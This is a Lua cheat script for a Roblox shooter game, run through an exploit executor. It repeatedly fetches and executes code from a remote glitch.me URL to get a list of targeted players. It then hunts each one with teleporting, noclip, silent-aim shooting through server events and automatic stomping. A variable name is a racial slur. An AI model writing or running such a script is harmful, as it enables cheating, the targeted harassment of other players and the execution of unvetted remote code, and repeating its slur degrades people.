-- queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
print("working")
local test,ing = pcall(function()
local function waitForDisconnect(connection)
    return coroutine.wrap(function()
        while connection.Connected do
            coroutine.yield()  -- Yield until the next frame
        end
        -- When disconnected, resume the coroutine
    end)
end
local newattack = true 
function attack(target)
    
    print("attacking.../")
    local attack = true
    local gun = "[LMG]"
    local player = game.Players.LocalPlayer
    local character = game.Players.LocalPlayer.Character

    function noclipactive()
        for i, v in pairs(character:GetChildren()) do
            if v:IsA("BasePart") then
                v.CanCollide = false
            end
        end
    end

    function grabguns()
        local lmg = game.Workspace.Ignored.Shop:FindFirstChild("[LMG] - $3978")
        local lmgAMMO = game.Workspace.Ignored.Shop:FindFirstChild("200 [LMG Ammo] - $318")

        game.Players.LocalPlayer.Character.PrimaryPart.CFrame = lmg.Head.CFrame
        wait(1)
        fireclickdetector(lmg.ClickDetector)
        wait(1)
        repeat task.wait()
        until lmgAMMO:FindFirstChild("ClickDetector")
        local cd = lmgAMMO:FindFirstChild("ClickDetector")
        game.Players.LocalPlayer.Character.PrimaryPart.CFrame = lmgAMMO.Head.CFrame
        for i = 1, 15 do
            wait(1)
            if cd then
                fireclickdetector(cd)
            end
        end
    end

    if game.Players.LocalPlayer.PlayerGui:FindFirstChild("Framework", true) then
        game.Players.LocalPlayer.PlayerGui:FindFirstChild("Framework", true):Destroy()
    end

    function shoot()
        game.ReplicatedStorage.MainEvent:FireServer("ShootButton")
    end

    function setupgun()
        if player.Backpack:FindFirstChild(gun) then
            local tool = player.Backpack:FindFirstChild(gun)
            character.Humanoid:EquipTool(tool)
            shoot()
            tool.Ammo.Changed:Connect(function()
                if tool.Ammo.Value < 1 then
                    game.ReplicatedStorage.MainEvent:FireServer("Reload", tool)
                else
                    shoot()
                end
            end)
        else
            grabguns()
        end
    end

    function Reload()
        if character:FindFirstChildWhichIsA("Tool") then
            local tool = character:FindFirstChildWhichIsA("Tool")
            if tool:FindFirstChild("Ammo") and tool:FindFirstChild("Ammo").Value == 0 then
                game.ReplicatedStorage.MainEvent:FireServer("Reload", tool)
            end
        end
    end

    function stomp()
        game.ReplicatedStorage.MainEvent:FireServer("Stomp")
    end

    local Distance = 10
    local Character = character

    -- Initialize the global prediction value
    getgenv().VoidxSilent = getgenv().VoidxSilent or {}
    getgenv().VoidxSilent.Prediction = 0.235 -- Set the original prediction value

    -- Function to get the closest hit point, always returning the HumanoidRootPart
    local function GetClosestHitPoint(targetModel)
        if targetModel then
            local humanoidRootPart = targetModel:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                return humanoidRootPart, humanoidRootPart.Position
            end
        end
        return nil, nil
    end

    -- Store the original prediction value
    local originalPrediction = getgenv().VoidxSilent.Prediction

    -- Function to get the velocity of the target's part
    local function GetVelocity(target, partName)
        if target and target.Character then
            local targetPart = target.Character:FindFirstChild(partName)
            if targetPart then
                local velocity = targetPart.Velocity
                if velocity.Y < -30 and getgenv().VoidxSilent.Resolver then
                    getgenv().VoidxSilent.Prediction = 0
                    return velocity
                elseif velocity.Magnitude > 50 and getgenv().VoidxSilent.Resolver then
                    return target.Character:FindFirstChild("Humanoid").MoveDirection * 16
                else
                    getgenv().VoidxSilent.Prediction = originalPrediction
                    return velocity
                end
            end
        end
        return Vector3.new(0, 0, 0)
    end

    setupgun()

    local SineX, SineZ = 0, math.pi / 2
    local HumanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    local bd = target.Character:FindFirstChild("BodyEffects")
    local ko = bd:FindFirstChild("K.O") or bd:FindFirstChild("KO")
    ko:GetPropertyChangedSignal("Value"):Connect(function()
        if not character then player.CharacterAdded:Wait() end 
        if ko.Value then
            character.Humanoid:UnequipTools()
            attack = not ko.Value
            repeat
                wait(0.5)
                character:PivotTo(target.Character.UpperTorso.CFrame)
                game.ReplicatedStorage.MainEvent:FireServer("Stomp")
            until bd:FindFirstChild("Dead").Value == true or bd:FindFirstChild("K.O").Value == false
            game.Players.LocalPlayer.Character:PivotTo(CFrame.new(Vector3.new(-217, 27, 181)) * CFrame.Angles(0, 0, 0))
        end
    end)

    target.CharacterAdded:Connect(function()
        wait(1)
        repeat
            task.wait()
        until not target.Character:FindFirstChildWhichIsA("ForceField")
        attack = true
        local bd = target.Character:FindFirstChild("BodyEffects")
        local ko = bd:FindFirstChild("K.O") or bd:FindFirstChild("KO")
        ko:GetPropertyChangedSignal("Value"):Connect(function()
            if not character then player.CharacterAdded:Wait() end 
            if ko.Value then
                
                character.Humanoid:UnequipTools()
                attack = not ko.Value
                repeat
                    wait(0.5)
                    character:PivotTo(target.Character.UpperTorso.CFrame)
                    game.ReplicatedStorage.MainEvent:FireServer("Stomp")
                until bd:FindFirstChild("Dead").Value == true or bd:FindFirstChild("K.O").Value == false
                game.Players.LocalPlayer.Character:PivotTo(CFrame.new(Vector3.new(-217, 27, 181)) * CFrame.Angles(0, 0, 0))
            end
        end)
    end)
    local increment = 0
    local connection
   connection =  game:GetService("RunService").RenderStepped:Connect(function()
        if newattack and target then
            if attack then
            if not game.Players.LocalPlayer.Character then game.Players.LocalPlayer.CharacterAdded:Wait() end
            if not target.Character then target.CharacterAdded:Wait() end
            increment += 1
            if increment > 300 then
                increment = 0
                local database
                local success,error = pcall(function()
                database = loadstring(game:HttpGet("https://polite-tropical-bonsai.glitch.me/"))()
                end)
                if database then
                    local found = false
                    for i,v in pairs(database) do
                        if i == tostring(target.UserId) then
                            found = true
                        end
                    end
                    if not found then 
                        newattack = false
                        target = nil
                        connection:Disconnect()
                        return
                    end
                else
                    print(error)
                end
            end
            local Part
            if target.Character.Head then
            Part = target.Character.Head
            else
            Part = target.Character.PrimaryPart
            end

            noclipactive()
            shoot()
            Reload()
            if not character:FindFirstChildWhichIsA("Tool") then setupgun() end
            local s, t = GetClosestHitPoint(target.Character)
            local v = GetVelocity(target, s.Name)
            game.ReplicatedStorage.MainEvent:FireServer("UpdateMousePosI", t + v * getgenv().VoidxSilent.Prediction)

            SineX, SineZ = SineX + 1, SineZ + 1
            local SinX, SinZ = math.sin(SineX), math.sin(SineZ)
            if HumanoidRootPart and character and target.Character then
                HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                HumanoidRootPart.CFrame = CFrame.new(SinX * Distance, 10, SinZ * Distance) *
                    (HumanoidRootPart.CFrame - HumanoidRootPart.CFrame.p) +
                    Part.CFrame.p 
            end
        end
        else
            target = nil 
            newattack = false
            connection:Disconnect()
    end
    end)
    local waiting = waitForDisconnect(connection)
end

local nigga = true
while nigga do
    if  newattack then return end
    game.Players.LocalPlayer.Character:PivotTo(CFrame.new(Vector3.new(-217, 27, 181)) * CFrame.Angles(0, 0, 0))
    print("Checking....")
    local dictionary = loadstring(game:HttpGet("https://polite-tropical-bonsai.glitch.me/"))()
    local JobId = game.JobId
    for i, v in pairs(dictionary) do
        print("checking2")
        local id = i
        if i ~= "placeholder" then
            local joinid = v[1]
            local uniqueidentifier = v[2]
            print(joinid)
            print(id)
            if JobId == joinid then
                print("found the pussio")
                local plr
                for _, payers in pairs(game.Players:GetChildren()) do
                    if tostring(payers.UserId) == id then
                        attack(payers)
                        game.Players.LocalPlayer.Character:PivotTo(CFrame.new(Vector3.new(-217, 27, 181)) * CFrame.Angles(0, 0, 0))
                        break
                    end
                end
            end
        end
    end
    wait(5)
end
end)
if ing then print(ing) end
